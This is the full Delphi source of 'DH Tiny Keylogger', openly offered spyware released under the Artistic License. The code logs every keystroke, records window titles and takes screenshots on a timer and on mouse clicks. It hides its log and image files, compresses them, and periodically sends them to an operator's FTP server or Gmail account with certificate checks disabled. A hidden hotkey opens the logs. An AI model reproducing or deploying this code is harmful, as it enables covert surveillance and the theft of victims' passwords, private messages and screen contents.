{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// Unit : DH Tiny Keylogger
// Version : 0.3
// (C) Doddy Hackman 2016

unit DH_TinyKeylogger;

interface

uses
  SysUtils, Windows, WinInet, ShellApi, Vcl.Graphics, Vcl.Imaging.jpeg,
  System.Zip, IdMessage, IdSMTPBase, IdSMTP, IdAttachment,
  IdAttachmentFile, IdSSLOpenSSL, IdGlobal, IdExplicitTLSClientServerBase;

type
  T_DH_TinyKeylogger = class
  private
    FThread: Integer;
    function savefile(archivo, texto: string): bool;
    procedure capture_keys;
    procedure capture_windows;
    procedure capture_screenshots;
    procedure upload_ftp;
    procedure send_mail;
    procedure open_logs;
  public

    time_keylogger_keys: Integer;
    time_keylogger_windows: Integer;
    time_take_screenshots: Integer;
    time_upload_ftp: Integer;
    time_send_mail: Integer;

    screen_click: string;

    ftp_host: Pchar;
    ftp_user: Pchar;
    ftp_password: Pchar;
    ftp_dir: Pchar;

    mail_user: string;
    mail_pass: string;
    mail_to: string;

    directory: string;
    logs_name: string;
    full_path_logs_keylogger: string;
    logs_zip_name: string;
    screenshot_name: string;

    constructor Create;
    destructor Destroy; override;

    procedure LoadVars;

    function send_gmail(username, password, message_to, subject, body,
      file_to_send: string): boolean;
    function upload_ftp_file(Host, username, password, file_to_upload,
      new_name: Pchar): boolean;
    function compress_logs_and_send(option: string): boolean;
    function take_screenshot(screenshot_name: string;
      hide_image: string): boolean;

    procedure start_keylogger_keys;
    procedure start_keylogger_windows;
    procedure start_screenshoter;
    procedure start_ftp_uploader;
    procedure start_gmail_sender;
    procedure start_keylogger_logs;

  end;

  // Auxiliar functions

implementation

constructor T_DH_TinyKeylogger.Create;
begin
  inherited Create;
  //
end;

destructor T_DH_TinyKeylogger.Destroy;
begin
  //
  inherited Destroy;
end;

procedure T_DH_TinyKeylogger.LoadVars;
begin

  if (time_keylogger_keys <= 0) then
  begin
    time_keylogger_keys := 50;
  end;
  if (time_keylogger_windows <= 0) then
  begin
    time_keylogger_windows := 100;
  end;
  if (time_take_screenshots <= 0) then
  begin
    time_take_screenshots := 3600 * 1000;
  end;
  if (time_upload_ftp <= 0) then
  begin
    time_upload_ftp := 7200 * 1000;
  end;
  if (time_send_mail <= 0) then
  begin
    time_send_mail := 7200 * 1000;
  end;

  if (directory = '') then
  begin
    directory := GetCurrentDir;
  end;

  if (logs_name = '') then
  begin
    logs_name := 'logs.html';
  end;

  if (logs_zip_name = '') then
  begin
    logs_zip_name := 'logs.zip';
  end;

  if (screenshot_name = '') then
  begin
    screenshot_name := 'screen.jpg';
  end;

  if (full_path_logs_keylogger = '') then
  begin
    full_path_logs_keylogger := directory + '/' + logs_name;
  end;

  if not(FileExists(full_path_logs_keylogger)) then
  begin
    savefile(full_path_logs_keylogger,
      '<style>body {background-color: black;color:#00FF00;cursor:crosshair;}</style>');
    SetFileAttributes(Pchar(full_path_logs_keylogger), FILE_ATTRIBUTE_HIDDEN);
  end;

end;

// Auxiliar Functions

function compress_file(zipfile, filename: string): boolean;
var
  zip_compress: TZipFile;
begin

  if (FileExists(filename)) then
  begin
    try
      begin
        zip_compress := TZipFile.Create;

        if (FileExists(zipfile)) then
        begin
          zip_compress.Open(zipfile, zmReadWrite);
        end
        else
        begin
          zip_compress.Open(zipfile, zmWrite);
        end;

        zip_compress.Add(filename);

        zip_compress.Free();

        Result := True;

      end;
    except
      begin
        Result := False;
      end;
    end;
  end
  else
  begin
    Result := False;
  end;
end;

function T_DH_TinyKeylogger.send_gmail(username, password, message_to, subject,
  body, file_to_send: string): boolean;

// Based on : http://stackoverflow.com/questions/7717495/starttls-error-while-sending-email-using-indy-in-delphi-xe
// Thanks to TLama

var
  data: TIdMessage;
  mensaje: TIdSMTP;
  SSL: TIdSSLIOHandlerSocketOpenSSL;
  new_name: string;

begin
  if not(username = '') and not(password = '') and not(message_to = '') and
    not(subject = '') and not(body = '') then
  begin
    try
      begin
        mensaje := TIdSMTP.Create(nil);
        data := TIdMessage.Create(nil);
        SSL := TIdSSLIOHandlerSocketOpenSSL.Create(nil);

        SSL.MaxLineAction := maException;
        SSL.SSLOptions.Method := sslvTLSv1;
        SSL.SSLOptions.Mode := sslmUnassigned;
        SSL.SSLOptions.VerifyMode := [];
        SSL.SSLOptions.VerifyDepth := 0;

        data.From.Address := username;
        data.Recipients.EMailAddresses := message_to;
        data.subject := subject;
        data.body.text := body;

        new_name := '';

        if FileExists(file_to_send) then
        begin
          new_name := directory + '/' + 'DH_Logs.txt';
          CopyFile(Pchar(file_to_send), Pchar(new_name), False);
          TIdAttachmentFile.Create(data.MessageParts, new_name);
        end;

        mensaje.IOHandler := SSL;
        mensaje.Host := 'smtp.gmail.com';
        mensaje.Port := 587;
        mensaje.username := username;
        mensaje.password := password;
        mensaje.UseTLS := utUseExplicitTLS;

        mensaje.Connect;
        mensaje.Send(data);
        mensaje.Disconnect;

        mensaje.Free;
        data.Free;
        SSL.Free;

        if FileExists(new_name) then
        begin
          DeleteFile(Pchar(new_name));
        end;

        Result := True;

      end;
    except
      begin
        //
      end;
    end;
  end
  else
  begin
    Result := False;
  end;

end;

function T_DH_TinyKeylogger.savefile(archivo, texto: string): bool;
var
  open_file: TextFile;
begin
  try
    begin
      AssignFile(open_file, archivo);
      FileMode := fmOpenWrite;

      if FileExists(archivo) then
      begin
        Append(open_file);
      end
      else
      begin
        Rewrite(open_file);
      end;

      Write(open_file, texto);
      CloseFile(open_file);
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function T_DH_TinyKeylogger.upload_ftp_file(Host, username, password,
  file_to_upload, new_name: Pchar): boolean;

// Credits :
// Based on : http://stackoverflow.com/questions/1380309/why-is-my-program-not-uploading-file-on-remote-ftp-server
// Thanks to Omair Iqbal

var
  handle1: HINTERNET;
  handle2: HINTERNET;

begin
  if not(Host = '') and not(username = '') and not(file_to_upload = '') and
    not(new_name = '') and FileExists(file_to_upload) then
  begin
    try
      begin
        handle1 := InternetOpen(0, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
        handle2 := InternetConnect(handle1, Host, INTERNET_DEFAULT_FTP_PORT,
          username, password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
        ftpPutFile(handle2, file_to_upload, new_name,
          FTP_TRANSFER_TYPE_BINARY, 0);
        InternetCloseHandle(handle2);
        InternetCloseHandle(handle1);
        Result := True;
      end
    except
      //
    end;
  end
  else
  begin
    Result := False;
  end;

end;

function T_DH_TinyKeylogger.compress_logs_and_send(option: string): boolean;
var
  search: TSearchRec;
begin

  try
    begin

      compress_file(directory + '/' + logs_zip_name,
        directory + '\' + logs_name);

      if FindFirst(directory + '\*.jpg', faAnyFile, search) = 0 then
      begin
        repeat
          compress_file(directory + '/' + logs_zip_name,
            directory + '\' + search.Name);
        until FindNext(search) <> 0;
        SysUtils.FindClose(search);
      end;

      SetFileAttributes(Pchar(directory + '/' + logs_zip_name),
        FILE_ATTRIBUTE_HIDDEN);

      if (option = 'ftp') then
      begin
        upload_ftp_file(Pchar(ftp_host), Pchar(ftp_user), Pchar(ftp_password),
          Pchar(directory + '/' + logs_zip_name),
          Pchar(ftp_dir + '/' + logs_zip_name));
      end
      else if (option = 'gmail') then
      begin
        send_gmail(mail_user, mail_pass, mail_to, 'Logs', 'Enjoy the logs',
          Pchar(directory + '/' + logs_zip_name));
      end
      else
      begin
        //
      end;

      if (FileExists(directory + '/' + logs_zip_name)) then
      begin
        DeleteFile(Pchar(directory + '/' + logs_zip_name));
      end;

      Result := True;

    end;
  except
    begin
      Result := False;
    end;
  end;

end;

function T_DH_TinyKeylogger.take_screenshot(screenshot_name: string;
  hide_image: string): boolean;

// Function capturar() based in :
// http://forum.codecall.net/topic/60613-how-to-capture-screen-with-delphi-code/
// http://delphi.about.com/cs/adptips2001/a/bltip0501_4.htm
// http://stackoverflow.com/questions/21971605/show-mouse-cursor-in-screenshot-with-delphi
// Thanks to Zarko Gajic , Luthfi and Ken White

var
  hdc_now: HDC;
  rect: TRect;
  cursor_position: TPoint;
  image1: TBitmap;
  image2: TJpegImage;
  cursor_mouse: THandle;

begin

  if not(screenshot_name = '') then
  begin
    try
      begin
        hdc_now := GetWindowDC(GetDesktopWindow);
        image1 := TBitmap.Create;

        GetWindowRect(GetDesktopWindow, rect);
        image1.Width := rect.Right - rect.Left;
        image1.Height := rect.Bottom - rect.Top;
        BitBlt(image1.Canvas.Handle, 0, 0, image1.Width, image1.Height, hdc_now,
          0, 0, SRCCOPY);

        GetCursorPos(cursor_position);

        cursor_mouse := GetCursor;
        DrawIconEx(image1.Canvas.Handle, cursor_position.X, cursor_position.Y,
          cursor_mouse, 32, 32, 0, 0, DI_NORMAL);

        image2 := TJpegImage.Create;
        image2.Assign(image1);
        image2.CompressionQuality := 60;

        image2.SaveToFile(directory + '/' + screenshot_name);

        if (hide_image = '1') then
        begin
          if (FileExists(directory + '/' + screenshot_name)) then
          begin
            SetFileAttributes(Pchar(directory + '/' + screenshot_name),
              FILE_ATTRIBUTE_HIDDEN);
          end;
        end;

        image1.Free;
        image2.Free;

        Result := True;

      end;
    except
      begin
        //
      end;
    end;
  end
  else
  begin
    Result := False;
  end;

end;

// End of auxiliar functions

// Vital Functions

procedure T_DH_TinyKeylogger.capture_keys;

var
  I: Integer;
  Result: Longint;
  mayus: Integer;
  shift: Integer;
  banknow: string;

const

  n_numeros_izquierda: array [1 .. 10] of string = ('48', '49', '50', '51',
    '52', '53', '54', '55', '56', '57');

const
  t_numeros_izquierda: array [1 .. 10] of string = ('0', '1', '2', '3', '4',
    '5', '6', '7', '8', '9');

const
  n_numeros_derecha: array [1 .. 10] of string = ('96', '97', '98', '99', '100',
    '101', '102', '103', '104', '105');

const
  t_numeros_derecha: array [1 .. 10] of string = ('0', '1', '2', '3', '4', '5',
    '6', '7', '8', '9');

const
  n_shift: array [1 .. 22] of string = ('48', '49', '50', '51', '52', '53',
    '54', '55', '56', '57', '187', '188', '189', '190', '191', '192', '193',
    '291', '220', '221', '222', '226');

const
  t_shift: array [1 .. 22] of string = ('=', '!', '@', '#', '$', '%', '&', '/',
    '(', ')', '=', '<', '_', '>', ':', '\', ' ? ', ' / \ ', '}', '{', '^', '|');

const
  n_raros: array [1 .. 71] of string = ('1', '2', '8', '13', '32', '46', '187',
    '188', '189', '190', '191', '193', '219', '220', '221', '222', '226', '47',
    '42', '45', '27', '112', '113', '114', '115', '116', '117', '118', '119',
    '120', '121', '122', '123', '9', '17', '18', '16', '91', '92', '33', '34',
    '35', '36', '37', '38', '39', '40', '95', '111', '106', '107', '109', '20',
    '44', '145', '144', '164', '165', '172', '180', '181', '173', '174', '175',
    '176', '177', '178', '179', '19', '93', '190');

const
  t_raros: array [1 .. 71] of string = ('[LEFT MOUSE CLICK]',
    '[RIGHT MOUSE CLICK]', '[BACKSPACE]', '<br>[ENTER]<br>', '[SPACE]',
    '[SUPR]', '+', ',', '-', '.', 'Ç', ' / ', ' \ \ \ ', 'º', '[', '´', '\/',
    '/', '*', '[INSERT]', '[ESCAPE]', '[F1]', '[F2]', '[F3]', '[F4]', '[F5]',
    '[F6]', '[F7]', '[F8]', '[F9]', '[F10]', '[F11]', '[F12]', '[TAB]',
    '[CONTROL]', '[ALT]', '[SHIFT]', '[WIN]', '[WIN]', '[PAGE UP]',
    '[PAGE DOWN]', '[END]', '[HOME]', '[LEFT ARROW]', '[UP ARROW]',
    '[RIGHT ARROW]', '[DOWN ARROW]', '[SLEEP]', '/', '*', '+', '-',
    '[CAPS LOCK]', '[PRINT SCREEN]', '[SCROLL LOCK]', '[NUM LOCK]',
    '[LEFT MENU]', '[RIGHT MENU]', '[BROWSER]', '[MAIL]', '[MEDIA]',
    '[VOLUME MUTE]', '[VOLUME DOWN]', '[VOLUME UP]', '[NEXT TRACK]',
    '[PREVIOUS TRACK]', '[STOP MEDIA]', '[PLAY/PAUSE MEDIA]', '[PAUSE]',
    '[MENU]', '.');

begin

  while (1 = 1) do
  begin

    Sleep(time_keylogger_keys); // Time

    try

      begin

        // Others

        for I := Low(n_raros) to High(n_raros) do
        begin
          Result := GetAsyncKeyState(StrToInt(n_raros[I]));
          If Result = -32767 then
          begin
            savefile(full_path_logs_keylogger, t_raros[I]);
            if (screen_click = '1') then
            begin
              if (t_raros[I] = '[LEFT MOUSE CLICK]') then
              begin
                banknow := IntToStr(Random(10000)) + '.jpg';
                take_screenshot(banknow, '1');
                SetFileAttributes(Pchar(directory + '/' + banknow),
                  FILE_ATTRIBUTE_HIDDEN);

                savefile(full_path_logs_keylogger,
                  '<br><br><center><img width=100% height=100% src=' + banknow +
                  '></center><br><br>');

              end;
            end;
          end;
        end;

        // SHIFT

        if (GetAsyncKeyState(VK_SHIFT) <> 0) then
        begin

          for I := Low(n_shift) to High(n_shift) do
          begin
            Result := GetAsyncKeyState(StrToInt(n_shift[I]));
            If Result = -32767 then
            begin
              savefile(full_path_logs_keylogger, t_shift[I]);
            end;
          end;

          for I := 65 to 90 do
          begin
            Result := GetAsyncKeyState(I);
            If Result = -32767 then
            Begin
              savefile(full_path_logs_keylogger, Chr(I + 0));
            End;
          end;

        end;

        // Numbers

        for I := Low(n_numeros_derecha) to High(n_numeros_derecha) do
        begin
          Result := GetAsyncKeyState(StrToInt(n_numeros_derecha[I]));
          If Result = -32767 then
          begin
            savefile(full_path_logs_keylogger, t_numeros_derecha[I]);
          end;
        end;

        for I := Low(n_numeros_izquierda) to High(n_numeros_izquierda) do
        begin
          Result := GetAsyncKeyState(StrToInt(n_numeros_izquierda[I]));
          If Result = -32767 then
          begin
            savefile(full_path_logs_keylogger, t_numeros_izquierda[I]);
          end;
        end;

        // MAYUS

        if (GetKeyState(20) = 0) then
        begin
          mayus := 32;
        end
        else
        begin
          mayus := 0;
        end;

        for I := 65 to 90 do
        begin
          Result := GetAsyncKeyState(I);
          If Result = -32767 then
          Begin
            savefile(full_path_logs_keylogger, Chr(I + mayus));
          End;
        end;
      end;
    except
      //
    end;

  end;
end;

procedure T_DH_TinyKeylogger.capture_windows;
var
  ventana1: array [0 .. 255] of Char;
  nombre1: string;
  Nombre2: string; //
begin
  while (1 = 1) do
  begin

    try

      begin
        Sleep(time_keylogger_windows); // Time

        GetWindowText(GetForegroundWindow, ventana1, sizeOf(ventana1));

        nombre1 := ventana1;

        if not(nombre1 = Nombre2) then
        begin
          Nombre2 := nombre1;
          savefile(full_path_logs_keylogger,
            '<hr style=color:#00FF00><h2><center>' + Nombre2 +
            '</h2></center><br>');
        end;

      end;
    except
      //
    end;
  end;

end;

procedure T_DH_TinyKeylogger.capture_screenshots;
var
  name_generated: string;
begin
  while (1 = 1) do
  begin

    Sleep(time_take_screenshots);

    name_generated := IntToStr(Random(10000)) + '.jpg';

    try
      begin
        take_screenshot(name_generated, '1');
      end;
    except
      //
    end;

    SetFileAttributes(Pchar(directory + '/' + name_generated),
      FILE_ATTRIBUTE_HIDDEN);

    savefile(full_path_logs_keylogger,
      '<br><br><center><img width=100% height=100% src=' + name_generated +
      '></center><br><br>');

  end;
end;

procedure T_DH_TinyKeylogger.upload_ftp;
begin
  while (1 = 1) do
  begin
    try
      begin
        Sleep(time_upload_ftp);
        compress_logs_and_send('ftp');
      end;
    except
      //
    end;
  end;
end;

procedure T_DH_TinyKeylogger.send_mail;
begin
  while (1 = 1) do
  begin
    try
      begin
        Sleep(time_send_mail);
        compress_logs_and_send('gmail');
      end;
    except
      //
    end;
  end;
end;

procedure T_DH_TinyKeylogger.open_logs;
var
  I: Integer;
  re: Longint;
begin

  while (1 = 1) do
  begin

    try

      begin

        Sleep(time_keylogger_keys);

        if (GetAsyncKeyState(VK_SHIFT) <> 0) then
        begin

          re := GetAsyncKeyState(120);
          If re = -32767 then
          Begin

            ShellExecute(0, nil, Pchar(full_path_logs_keylogger), nil, nil,
              SW_SHOWNORMAL);

          end;
        end;
      end;
    except
      //
    end;
  end;
end;

// End of vital functions

// Threads Launcher

function launch_capture_keys(controls: Pointer): Integer;
begin
  T_DH_TinyKeylogger(controls).capture_keys;
end;

function launch_capture_windows(controls: Pointer): Integer;
begin
  T_DH_TinyKeylogger(controls).capture_windows;
end;

function launch_start_screenshoter(controls: Pointer): Integer;
begin
  T_DH_TinyKeylogger(controls).capture_screenshots;
end;

function launch_start_ftp_uploader(controls: Pointer): Integer;
begin
  T_DH_TinyKeylogger(controls).upload_ftp;
end;

function launch_start_gmail_sender(controls: Pointer): Integer;
begin
  T_DH_TinyKeylogger(controls).send_mail;
end;

function launch_start_keylogger_logs(controls: Pointer): Integer;
begin
  T_DH_TinyKeylogger(controls).open_logs;
end;

//

// Functions Main

procedure T_DH_TinyKeylogger.start_keylogger_keys;
var
  ThreadId: TThreadID;
begin
  FThread := BeginThread(nil, 0, launch_capture_keys, Self, 0, ThreadId);
end;

procedure T_DH_TinyKeylogger.start_keylogger_windows;
var
  ThreadId: TThreadID;
begin
  FThread := BeginThread(nil, 0, launch_capture_windows, Self, 0, ThreadId);
end;

procedure T_DH_TinyKeylogger.start_screenshoter;
var
  ThreadId: TThreadID;
begin
  FThread := BeginThread(nil, 0, launch_start_screenshoter, Self, 0, ThreadId);
end;

procedure T_DH_TinyKeylogger.start_ftp_uploader;
var
  ThreadId: TThreadID;
begin
  FThread := BeginThread(nil, 0, launch_start_ftp_uploader, Self, 0, ThreadId);
end;

procedure T_DH_TinyKeylogger.start_gmail_sender;
var
  ThreadId: TThreadID;
begin
  FThread := BeginThread(nil, 0, launch_start_gmail_sender, Self, 0, ThreadId);
end;

procedure T_DH_TinyKeylogger.start_keylogger_logs;
var
  ThreadId: TThreadID;
begin
  FThread := BeginThread(nil, 0, launch_start_keylogger_logs, Self, 0,
    ThreadId);
end;

//

end.

// The End ?
